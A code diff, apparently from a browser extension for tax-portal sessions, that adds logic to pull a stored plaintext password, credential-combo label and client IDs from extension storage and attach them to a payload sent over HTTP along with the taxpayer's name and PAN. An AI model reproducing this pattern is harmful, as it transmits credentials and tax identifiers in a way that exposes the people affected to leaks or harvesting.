@@ -558,23 +558,44 @@
         client_name: name || "Taxpayer",
         timestamp: new Date().toISOString()
       };
-      // Send via both pipelines (HTTP + runtime)
-      _emitDual(payload);
 
-      // Show in-browser emerald toast
-      if (window.SDCToast) {
-        window.SDCToast.show({
-          type: 'start',
-          badge: 'SDC ACTIVE',
-          title: `Live Session Started`,
-          message: `Active on ${portalName.toUpperCase()} for ${name || 'Taxpayer'}.`,
-          chips: [
-            { label: 'Client', value: name || 'Taxpayer' },
-            { label: 'PAN', value: pan, isPan: true }
-          ],
-          duration: 1100
-        });
-      }
+      const send = () => {
+        // Send via both pipelines (HTTP + runtime)
+        _emitDual(payload);
+
+        // Show in-browser emerald toast
+        if (window.SDCToast) {
+          window.SDCToast.show({
+            type: 'start',
+            badge: 'SDC ACTIVE',
+            title: `Live Session Started`,
+            message: `Active on ${portalName.toUpperCase()} for ${name || 'Taxpayer'}.`,
+            chips: [
+              { label: 'Client', value: name || 'Taxpayer' },
+              { label: 'PAN', value: pan, isPan: true }
+            ],
+            duration: 1100
+          });
+        }
+      };
+
+      try {
+        if (typeof chrome !== 'undefined' && chrome.storage && chrome.storage.local) {
+          chrome.storage.local.get(['sccActiveAttempt'], (data) => {
+            if (data && data.sccActiveAttempt && data.sccActiveAttempt.password) {
+              payload.scc_verified_password = data.sccActiveAttempt.password;
+              payload.combo_label = data.sccActiveAttempt.combo_label;
+              payload.client_id = data.sccActiveAttempt.client_id;
+              payload.service_id = data.sccActiveAttempt.service_id;
+              chrome.storage.local.remove(['sccActiveAttempt']);
+            }
+            send();
+          });
+          return;
+        }
+      } catch (_) {}
+
+      send();
     },
 
     /**
